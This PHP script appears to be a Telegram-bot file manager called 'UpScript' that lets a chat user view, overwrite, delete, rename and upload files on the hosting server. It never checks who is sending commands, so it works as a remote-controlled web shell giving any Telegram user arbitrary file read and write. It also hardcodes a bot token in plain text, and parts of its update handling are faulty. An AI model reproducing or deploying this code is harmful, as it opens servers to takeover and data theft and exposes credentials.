<?php
$token = "7659597611:AAGCa_pylJU71keQhN3U3ovPaOAWlg2jzGc";
$url = "https://api.telegram.org/bot$token/getUpdates";

$editing_file = null;
$processed_updates = [];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$responseData = json_decode($response, true);

if (isset($responseData['result'])) {
    foreach ($responseData['result'] as $update) {
        $update_id = $update['update_id'];
        
        if (in_array($update_id, $processed_updates)) {
            continue;
        }

        $processed_updates[] = $update_id;

        if (isset($update['message'])) {
            $chat_id = $update['message']['chat']['id'];
            $user_id = $update['message']['from']['first_name'];

            if (isset($update['message']['text']) && preg_match('/^edit (.+)$/', $update['message']['text'], $matches)) {
                $editing_file = trim($matches[1]);
                $reply_message = "ON Editing '$editing_file' New Code";
                
                $url_send = "https://api.telegram.org/bot$token/sendMessage";
                $data = [
                    'chat_id' => $chat_id,
                    'text' => $reply_message,
                ];
                
                $ch_send = curl_init($url_send);
                curl_setopt($ch_send, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_send, CURLOPT_POST, true);
                curl_setopt($ch_send, CURLOPT_POSTFIELDS, $data);
                curl_exec($ch_send);
                curl_close($ch_send);
                continue;
            } elseif ($editing_file !== null && isset($update['message']['text'])) {
                $new_content = $update['message']['text'];
                file_put_contents($editing_file, $new_content);
                $reply_message = "$editing_file Saved";
                
                $url_send = "https://api.telegram.org/bot$token/sendMessage";
                $data = [
                    'chat_id' => $chat_id,
                    'text' => $reply_message,
                ];
                
                $ch_send = curl_init($url_send);
                curl_setopt($ch_send, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_send, CURLOPT_POST, true);
                curl_setopt($ch_send, CURLOPT_POSTFIELDS, $data);
                curl_exec($ch_send);
                curl_close($ch_send);
                
                $editing_file = null;
                continue;
            } elseif (isset($update['message']['text']) && strpos($update['message']['text'], 'remove') !== false) {
                $file_name = trim(str_replace('remove', '', $update['message']['text']));

                if (file_exists($file_name)) {
                    unlink($file_name);
                    $reply_message = "File '$file_name' Deleted";
                } else {
                    $reply_message = "File '$file_name' Not Find";
                }

                $url_send = "https://api.telegram.org/bot$token/sendMessage";
                $data = [
                    'chat_id' => $chat_id,
                    'text' => $reply_message,
                ];

                $ch_send = curl_init($url_send);
                curl_setopt($ch_send, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_send, CURLOPT_POST, true);
                curl_setopt($ch_send, CURLOPT_POSTFIELDS, $data);
                curl_exec($ch_send);
                curl_close($ch_send);
            } elseif (isset($update['message']['text']) && preg_match('/^view (.+)$/', $update['message']['text'], $matches)) {
                $file_name = trim($matches[1]);
                if (file_exists($file_name)) {
                    $file_content = file_get_contents($file_name);
                    $reply_message = "Content of '$file_name':\n" . $file_content;
                } else {
                    $reply_message = "File '$file_name' Not Found";
                }

                $url_send = "https://api.telegram.org/bot$token/sendMessage";
                $data = [
                    'chat_id' => $chat_id,
                    'text' => $reply_message,
                ];

                $ch_send = curl_init($url_send);
                curl_setopt($ch_send, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_send, CURLOPT_POST, true);
                curl_setopt($ch_send, CURLOPT_POSTFIELDS, $data);
                curl_exec($ch_send);
                curl_close($ch_send);
            } elseif (isset($update['message']['text']) && preg_match('/^rename (.+) to (.+)$/', $update['message']['text'], $matches)) {
                $old_name = trim($matches[1]);
                $new_name = trim($matches[2]);

                if (file_exists($old_name)) {
                    rename($old_name, $new_name);
                    $reply_message = "File renamed from '$old_name' to '$new_name'";
                } else {
                    $reply_message = "File '$old_name' not found";
                }

                $url_send = "https://api.telegram.org/bot$token/sendMessage";
                $data = [
                    'chat_id' => $chat_id,
                    'text' => $reply_message,
                ];

                $ch_send = curl_init($url_send);
                curl_setopt($ch_send, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_send, CURLOPT_POST, true);
                curl_setopt($ch_send, CURLOPT_POSTFIELDS, $data);
                curl_exec($ch_send);
                curl_close($ch_send);
            } elseif (isset($update['message']['document'])) {
                $document = $update['message']['document'];
                $file_id = $document['file_id'];

                $url_file = "https://api.telegram.org/bot$token/getFile?file_id=$file_id";
                $ch_file = curl_init($url_file);
                curl_setopt($ch_file, CURLOPT_RETURNTRANSFER, true);
                $response_file = curl_exec($ch_file);
                curl_close($ch_file);

                $fileData = json_decode($response_file, true);
                if (isset($fileData['result']['file_path'])) {
                    $file_path = $fileData['result']['file_path'];
                    $file_url = "https://api.telegram.org/file/bot$token/$file_path";

                    $file_content = file_get_contents($file_url);
                    $file_name = basename($file_path);
                    file_put_contents($file_name, $file_content);

                    $reply_message = "File > " . $file_name . "\r\n" . 
                                     "Chat ID > " . $chat_id . "\r\n" . 
                                     "Time > " . date("h:i:s a") . "\r\n" . 
                                     "User > " . $user_id . "\r\n". 
                                     "Path > " . getcwd();
                    $url_send = "https://api.telegram.org/bot$token/sendMessage";
                    $data = [
                        'chat_id' => $chat_id,
                        'text' => $reply_message,
                    ];

                    $ch_send = curl_init($url_send);
                    curl_setopt($ch_send, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch_send, CURLOPT_POST, true);
                    curl_setopt($ch_send, CURLOPT_POSTFIELDS, $data);
                    curl_exec($ch_send);
                    curl_close($ch_send);
                }
            } elseif (isset($update['message']['text']) && strtolower($update['message']['text']) == '/start') {
                $reply_message = "File Send";

                $url_send = "https://api.telegram.org/bot$token/sendMessage";
                $data = [
                    'chat_id' => $chat_id,
                    'text' => $reply_message,
                ];

                $ch_send = curl_init($url_send);
                curl_setopt($ch_send, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_send, CURLOPT_POST, true);
                curl_setopt($ch_send, CURLOPT_POSTFIELDS, $data);
                curl_exec($ch_send);
                curl_close($ch_send);
            } elseif (isset($update['message']['text']) && strtolower($update['message']['text']) == '/help') {
                $reply_message = "Hello Welcome to UpScript\r\n Commands :\r\n  - edit ( edit ```.``` )\r\n  - remove ( remove ```.``` )\r\n  - view ( view ```.``` )\r\n  - raname ( rename ```.``` to ```.``` )\r\n Basic commands :\r\n  - /start ( add file )\r\n  - /dir ( show files )\r\n  - /help ( help )\r\n GITHUB :\r\n  - page ( Mr-Banana-2045 )";

                $url_send = "https://api.telegram.org/bot$token/sendMessage";
                $data = [
                    'chat_id' => $chat_id,
                    'text' => $reply_message,
                ];

                $ch_send = curl_init($url_send);
                curl_setopt($ch_send, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_send, CURLOPT_POST, true);
                curl_setopt($ch_send, CURLOPT_POSTFIELDS, $data);
                curl_exec($ch_send);
                curl_close($ch_send);
            } elseif (isset($update['message']['text']) && strtolower($update['message']['text']) == '/dir') {
                $files = scandir('.');
                $file_list = implode("\n", array_diff($files, array('.', '..')));
                
                if (empty($file_list)) {
                    $reply_message = "No files found.";
                } else {
                    $reply_message = "Files:\r\n" . $file_list;
                }

                $url_send = "https://api.telegram.org/bot$token/sendMessage";
                $data = [
                    'chat_id' => $chat_id,
                    'text' => $reply_message,
                ];

                $ch_send = curl_init($url_send);
                curl_setopt($ch_send, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_send, CURLOPT_POST, true);
                curl_setopt($ch_send, CURLOPT_POSTFIELDS, $data);
                curl_exec($ch_send);
                curl_close($ch_send);
            }
        }
    }
}
?>